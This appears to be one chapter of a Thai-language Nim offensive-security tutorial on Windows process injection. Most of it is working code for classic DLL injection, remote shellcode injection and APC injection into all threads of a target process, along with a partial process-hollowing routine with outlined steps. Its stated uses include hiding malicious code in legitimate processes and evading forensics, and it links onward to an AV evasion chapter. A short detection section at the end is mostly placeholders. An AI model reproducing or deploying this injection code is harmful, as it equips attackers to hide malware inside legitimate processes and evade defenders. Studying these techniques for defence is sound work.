# Part 33: Process Injection - เทคนิคการเข้าแทรก Process

> **คำเตือน**: เนื้อหานี้ใช้สำหรับการศึกษา, CTF, pentesting ที่ได้รับอนุญาต, และ defensive security research **เท่านั้น**

## Process Injection คืออะไร

```
Process Injection = การเข้าไป execute code ใน process อื่น
ใช้ในการ:
- Bypass application whitelisting
- Hide malicious code inside legitimate processes
- Privilege escalation
- Memory forensics evasion

Techniques:
1. Classic DLL Injection (LoadLibrary)
2. Reflective DLL Injection
3. Process Hollowing
4. Thread Hijacking
5. APC Injection
6. Atom Bombing
7. Early Bird Injection
```

## Classic DLL Injection

```nim
# classic_dll_inject.nim
# Educational example: Classic DLL Injection via LoadLibrary
# Used in: Red Team operations (authorized), malware research, AV testing

when defined(windows):
  import winlean, strutils, strformat

  # Additional Win32 imports
  proc OpenProcess*(dwDesiredAccess: DWORD, bInheritHandle: BOOL, 
                    dwProcessId: DWORD): HANDLE
    {.importc, dynlib: "kernel32".}
  
  proc VirtualAllocEx*(hProcess: HANDLE, lpAddress: pointer,
                       dwSize: SIZE_T, flAllocationType, flProtect: DWORD): pointer
    {.importc, dynlib: "kernel32".}
  
  proc WriteProcessMemory*(hProcess: HANDLE, lpBaseAddress: pointer,
                           lpBuffer: pointer, nSize: SIZE_T,
                           lpNumberOfBytesWritten: ptr SIZE_T): BOOL
    {.importc, dynlib: "kernel32".}
  
  proc CreateRemoteThread*(hProcess: HANDLE, lpThreadAttributes: pointer,
                           dwStackSize: SIZE_T, lpStartAddress: pointer,
                           lpParameter: pointer, dwCreationFlags: DWORD,
                           lpThreadId: ptr DWORD): HANDLE
    {.importc, dynlib: "kernel32".}
  
  proc GetModuleHandleA*(lpModuleName: cstring): HANDLE
    {.importc, dynlib: "kernel32".}
  
  proc GetProcAddress*(hModule: HANDLE, lpProcName: cstring): pointer
    {.importc, dynlib: "kernel32".}
  
  proc WaitForSingleObject*(hHandle: HANDLE, dwMilliseconds: DWORD): DWORD
    {.importc, dynlib: "kernel32".}
  
  const
    PROCESS_ALL_ACCESS = 0x1F0FFF.DWORD
    MEM_COMMIT = 0x1000.DWORD
    MEM_RESERVE = 0x2000.DWORD
    MEM_RELEASE = 0x8000.DWORD
    PAGE_READWRITE = 0x04.DWORD
    INFINITE = 0xFFFFFFFF.DWORD

  proc injectDLL(targetPid: DWORD, dllPath: string): bool =
    ## Inject DLL into target process using LoadLibraryA
    ## Requires PROCESS_ALL_ACCESS or specific rights
    
    # 1. Open target process
    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid)
    if hProcess == nil:
      echo &"[!] OpenProcess failed for PID {targetPid}"
      return false
    defer: discard CloseHandle(hProcess)
    
    # 2. Allocate memory for DLL path in target process
    let dllPathLen = dllPath.len + 1
    let remoteAddr = VirtualAllocEx(hProcess, nil, dllPathLen.SIZE_T,
                                    MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if remoteAddr == nil:
      echo "[!] VirtualAllocEx failed"
      return false
    
    # 3. Write DLL path into target process memory
    var bytesWritten: SIZE_T
    if WriteProcessMemory(hProcess, remoteAddr, unsafeAddr dllPath[0],
                          dllPathLen.SIZE_T, addr bytesWritten) == FALSE:
      echo "[!] WriteProcessMemory failed"
      return false
    
    echo &"[+] DLL path written to 0x{cast[uint](remoteAddr):016X}"
    
    # 4. Get LoadLibraryA address from kernel32.dll
    let kernel32 = GetModuleHandleA("kernel32.dll")
    let loadLibraryA = GetProcAddress(kernel32, "LoadLibraryA")
    
    echo &"[+] LoadLibraryA at 0x{cast[uint](loadLibraryA):016X}"
    
    # 5. Create remote thread to call LoadLibraryA with our DLL path
    var threadId: DWORD
    let hThread = CreateRemoteThread(hProcess, nil, 0,
                                     loadLibraryA, remoteAddr, 0, addr threadId)
    if hThread == nil:
      echo "[!] CreateRemoteThread failed"
      return false
    defer: discard CloseHandle(hThread)
    
    echo &"[+] Remote thread created: TID {threadId}"
    
    # 6. Wait for thread to complete
    discard WaitForSingleObject(hThread, INFINITE)
    
    echo "[+] DLL injection complete!"
    return true
  
  # Example usage (educational)
  # injectDLL(1234, "C:\\path\\to\\payload.dll")
```

## Shellcode Injection

```nim
# shellcode_inject.nim
# Inject shellcode into a remote process

when defined(windows):
  import winlean, strformat

  proc VirtualProtectEx*(hProcess: HANDLE, lpAddress: pointer,
                         dwSize: SIZE_T, flNewProtect: DWORD,
                         lpflOldProtect: ptr DWORD): BOOL
    {.importc, dynlib: "kernel32".}

  const
    PAGE_EXECUTE_READ = 0x20.DWORD
  
  proc injectShellcode(targetPid: DWORD, shellcode: seq[byte]): bool =
    ## Allocate memory in target process, write shellcode, create thread
    
    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid)
    if hProcess == nil: return false
    defer: discard CloseHandle(hProcess)
    
    # Allocate RW memory
    let mem = VirtualAllocEx(hProcess, nil, shellcode.len.SIZE_T,
                             MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if mem == nil: return false
    
    # Write shellcode
    var written: SIZE_T
    if WriteProcessMemory(hProcess, mem, unsafeAddr shellcode[0],
                          shellcode.len.SIZE_T, addr written) == FALSE:
      return false
    
    echo &"[+] Shellcode written ({written} bytes) to 0x{cast[uint](mem):016X}"
    
    # Change to RX protection
    var oldProtect: DWORD
    if VirtualProtectEx(hProcess, mem, shellcode.len.SIZE_T,
                        PAGE_EXECUTE_READ, addr oldProtect) == FALSE:
      return false
    
    # Create thread to execute shellcode
    var tid: DWORD
    let hThread = CreateRemoteThread(hProcess, nil, 0, mem, nil, 0, addr tid)
    if hThread == nil: return false
    defer: discard CloseHandle(hThread)
    
    discard WaitForSingleObject(hThread, INFINITE)
    return true
```

## APC Injection

```nim
# apc_injection.nim
# APC (Asynchronous Procedure Call) Injection
# Queues an APC to all threads in target process

when defined(windows):
  import winlean, strformat

  type
    THREADENTRY32 {.pure.} = object
      dwSize: DWORD
      cntUsage: DWORD
      th32ThreadID: DWORD
      th32OwnerProcessID: DWORD
      tpBasePri: int32
      tpDeltaPri: int32
      dwFlags: DWORD
  
  proc CreateToolhelp32Snapshot*(dwFlags: DWORD, th32ProcessID: DWORD): HANDLE
    {.importc, dynlib: "kernel32".}
  proc Thread32First*(hSnapshot: HANDLE, lpte: ptr THREADENTRY32): BOOL
    {.importc, dynlib: "kernel32".}
  proc Thread32Next*(hSnapshot: HANDLE, lpte: ptr THREADENTRY32): BOOL
    {.importc, dynlib: "kernel32".}
  
  proc OpenThread*(dwDesiredAccess: DWORD, bInheritHandle: BOOL,
                   dwThreadId: DWORD): HANDLE
    {.importc, dynlib: "kernel32".}
  
  proc QueueUserAPC*(pfnAPC: pointer, hThread: HANDLE, 
                     dwData: ULONG_PTR): DWORD
    {.importc, dynlib: "kernel32".}
  
  const
    TH32CS_SNAPTHREAD = 0x00000004.DWORD
    THREAD_SET_CONTEXT = 0x0010.DWORD
  
  proc apcInject(targetPid: DWORD, shellcode: seq[byte]): bool =
    ## Queue APC to alertable threads in target process
    
    # Allocate shellcode in target process
    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid)
    if hProcess == nil: return false
    defer: discard CloseHandle(hProcess)
    
    let mem = VirtualAllocEx(hProcess, nil, shellcode.len.SIZE_T,
                             MEM_COMMIT or MEM_RESERVE, 0x40.DWORD)  # PAGE_EXECUTE_READWRITE
    if mem == nil: return false
    
    var written: SIZE_T
    if WriteProcessMemory(hProcess, mem, unsafeAddr shellcode[0],
                          shellcode.len.SIZE_T, addr written) == FALSE:
      return false
    
    # Enumerate threads of target process
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    if snapshot == INVALID_HANDLE_VALUE: return false
    defer: discard CloseHandle(snapshot)
    
    var te: THREADENTRY32
    te.dwSize = sizeof(THREADENTRY32).DWORD
    var count = 0
    
    if Thread32First(snapshot, addr te) == TRUE:
      while true:
        if te.th32OwnerProcessID == targetPid:
          let hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID)
          if hThread != nil:
            if QueueUserAPC(mem, hThread, 0) != 0:
              inc count
              echo &"[+] APC queued to thread {te.th32ThreadID}"
            discard CloseHandle(hThread)
        if Thread32Next(snapshot, addr te) != TRUE:
          break
    
    echo &"[+] APC queued to {count} threads"
    return count > 0
```

## Process Hollowing

```nim
# process_hollowing.nim
# Process Hollowing: Create suspended process, replace its image
# Advanced technique used in evasion research

when defined(windows):
  import winlean, strformat

  type
    STARTUPINFOA {.pure.} = object
      cb: DWORD
      lpReserved, lpDesktop, lpTitle: cstring
      dwX, dwY, dwXSize, dwYSize: DWORD
      dwXCountChars, dwYCountChars: DWORD
      dwFillAttribute, dwFlags: DWORD
      wShowWindow, cbReserved2: WORD
      lpReserved2: ptr BYTE
      hStdInput, hStdOutput, hStdError: HANDLE

    PROCESS_INFORMATION {.pure.} = object
      hProcess, hThread: HANDLE
      dwProcessId, dwThreadId: DWORD
    
    CONTEXT64 {.pure.} = object
      # Simplified - real CONTEXT is much larger
      ContextFlags: DWORD
      # ... register fields ...
      Rax, Rcx, Rdx, Rbx: uint64
      Rsp, Rbp, Rsi, Rdi: uint64
      Rip: uint64  # Instruction pointer
  
  proc CreateProcessA*(lpApplicationName: cstring, lpCommandLine: cstring,
                       lpProcessAttr, lpThreadAttr: pointer, bInheritHandles: BOOL,
                       dwCreationFlags: DWORD, lpEnvironment: pointer,
                       lpCurrentDir: cstring, lpSI: ptr STARTUPINFOA,
                       lpPI: ptr PROCESS_INFORMATION): BOOL
    {.importc, dynlib: "kernel32".}
  
  proc NtUnmapViewOfSection*(hProcess: HANDLE, lpBaseAddress: pointer): NTSTATUS
    {.importc, dynlib: "ntdll".}
  
  proc GetThreadContext*(hThread: HANDLE, lpContext: pointer): BOOL
    {.importc, dynlib: "kernel32".}
  
  proc SetThreadContext*(hThread: HANDLE, lpContext: pointer): BOOL
    {.importc, dynlib: "kernel32".}
  
  proc ResumeThread*(hThread: HANDLE): DWORD
    {.importc, dynlib: "kernel32".}
  
  const
    CREATE_SUSPENDED = 0x00000004.DWORD
  
  proc hollowProcess(targetExe: string, payloadBytes: seq[byte]): bool =
    ## Conceptual process hollowing flow:
    ## 1. Create target process in suspended state
    ## 2. Unmap its image from memory (NtUnmapViewOfSection)
    ## 3. Allocate space and write payload PE
    ## 4. Update thread context to point to new entry point
    ## 5. Resume thread
    
    var si: STARTUPINFOA
    si.cb = sizeof(STARTUPINFOA).DWORD
    var pi: PROCESS_INFORMATION
    
    # Step 1: Create suspended process
    var cmd = targetExe
    if CreateProcessA(nil, cmd, nil, nil, FALSE, CREATE_SUSPENDED,
                      nil, nil, addr si, addr pi) == FALSE:
      echo "[!] Failed to create suspended process"
      return false
    
    echo &"[+] Created suspended process PID: {pi.dwProcessId}"
    echo &"[+] Main thread handle: {cast[uint](pi.hThread)}"
    
    # Step 2-5 would involve:
    # - Reading PEB from remote process to find image base
    # - NtUnmapViewOfSection to unmap existing image
    # - VirtualAllocEx to allocate new space
    # - Writing PE headers and sections
    # - Fixing relocations and imports
    # - Updating CONTEXT.Rip to new entry point
    # - ResumeThread
    
    echo "[*] Process hollowing steps (educational outline)"
    echo "    1. Read PEB: NtQueryInformationProcess -> ImageBaseAddress"
    echo "    2. Unmap: NtUnmapViewOfSection(hProcess, imageBase)"
    echo "    3. Allocate: VirtualAllocEx at preferred base"
    echo "    4. Write PE headers, sections"
    echo "    5. Fix relocations, patch imports"
    echo "    6. GetThreadContext -> modify RIP -> SetThreadContext"
    echo "    7. ResumeThread"
    
    # Cleanup for this demo
    discard TerminateProcess(pi.hProcess, 0)
    discard CloseHandle(pi.hProcess)
    discard CloseHandle(pi.hThread)
    
    return true
  
  # proc TerminateProcess*(hProcess: HANDLE, uExitCode: cuint): BOOL
  #   {.importc, dynlib: "kernel32".}
```

## การตรวจจับ / Detection

```nim
# injection_detection.nim
# ตรวจจับ Process Injection เพื่อ Defensive Security

when defined(windows):
  import winlean, strformat, tables

  # ตรวจสอบ ไม่ปกติ remote thread creation
  type ProcessInfo = object
    pid: DWORD
    name: string
    modules: seq[string]

  # Monitor for injected threads (suspicious: remote thread without DLL load)
  proc isThreadInjected(tid: DWORD): bool =
    # Heuristic: thread start address in non-image backed memory
    # Real detection would use ETW (Event Tracing for Windows)
    false  # placeholder

  # Check for classic injection indicators
  proc detectInjectionArtifacts(pid: DWORD): seq[string] =
    result = @[]
    
    let hProcess = OpenProcess(0x0010.DWORD or 0x0008.DWORD,  # QUERY + VM_READ
                                FALSE, pid)
    if hProcess == nil: return
    defer: discard CloseHandle(hProcess)
    
    # Look for executable memory regions not backed by files
    # (sign of injected shellcode)
    echo &"[*] Scanning PID {pid} for injection artifacts..."
    
    # Note: Full detection requires MEMORY_BASIC_INFORMATION scan
    # to find MEM_PRIVATE executable pages (anomalous)
    result.add("[*] Check for private executable memory regions")
    result.add("[*] Check for threads starting in unusual modules")
    result.add("[*] Check for suspicious API call patterns via ETW")

  # Detection patterns for each injection type:
  let detectionMethods = {
    "Classic DLL": @[
      "Monitor LoadLibrary calls",
      "Track CreateRemoteThread with LoadLibraryA arg",
      "API hooking / ETW events"
    ],
    "Shellcode Injection": @[
      "Scan for private RX memory regions",
      "Monitor VirtualAllocEx + WriteProcessMemory + CreateRemoteThread",
      "Check thread start address against module list"
    ],
    "Process Hollowing": @[
      "Detect NtUnmapViewOfSection calls",
      "Compare in-memory PE to on-disk PE (hash mismatch)",
      "Monitor suspended process creation + memory writes"
    ],
    "APC Injection": @[
      "Track QueueUserAPC calls",
      "Monitor alertable thread states",
      "Correlate with memory writes"
    ]
  }.toTable()
  
  for technique, methods in detectionMethods:
    echo "\n[Detection] ", technique, ":"
    for m in methods:
      echo "  - ", m
```

## สรุป Part 33

ในบทนี้เราได้เรียนรู้:
- ✅ Classic DLL Injection (LoadLibrary + CreateRemoteThread)
- ✅ Shellcode Injection ใน remote process
- ✅ APC Injection
- ✅ Process Hollowing (แนวคิดและขั้นตอน)
- ✅ Detection methods สำหรับ defenders

---

**Previous**: [Part 32 - Shellcode](part32_shellcode.md)
**Next**: [Part 34 - AV Evasion](part34_av_evasion.md)
